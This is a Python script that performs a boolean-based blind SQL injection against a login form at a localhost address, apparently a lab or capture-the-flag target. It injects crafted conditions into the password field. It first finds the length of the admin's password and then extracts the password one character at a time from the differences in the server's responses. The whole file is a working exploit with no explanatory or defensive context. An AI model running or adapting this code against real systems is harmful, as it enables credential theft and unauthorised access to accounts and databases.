import requests
url="http://127.0.0.1:5000/login"
info = "password"
query = "length(" + info + ")="

tmp1 = 0
for i in range(1000):
		s = requests.Session()
		s.get(url)
		params = {"username":"admin",'passwd':"')) or " + query +  str(i) + " and username=(('admin","ad":"nothing"}
		r = s.post(url,data=params)
	#print(r.url)
		if "unsuccessful login" in r.text:
			tmp1 = i
			print("length found => " + str(tmp1))
			break
		elif "incorrect username or password" in r.text:
			print("not login")
		else:
			print(r.text)
returnval = ""
query = "substr(" + info + ","
for i in range(1,tmp1 + 1):
	for j in range(48,123):
		s = requests.Session()
		s.get(url)
		params = {"username":"admin",'passwd':"')) or " + query + str(i) + ",1)='" + chr(j) + "' and username=(('admin", "ad":"something"}
		r = s.post(url,data=params)
		#print(r.url)
		if "unsuccessful login" in r.text:
			returnval += chr(j)
			print("found character => " + chr(j))
			break
		elif "incorrect" in r.text:
			print("\rquery wrong",end="")
		else:
			print(r.text)
print(returnval)
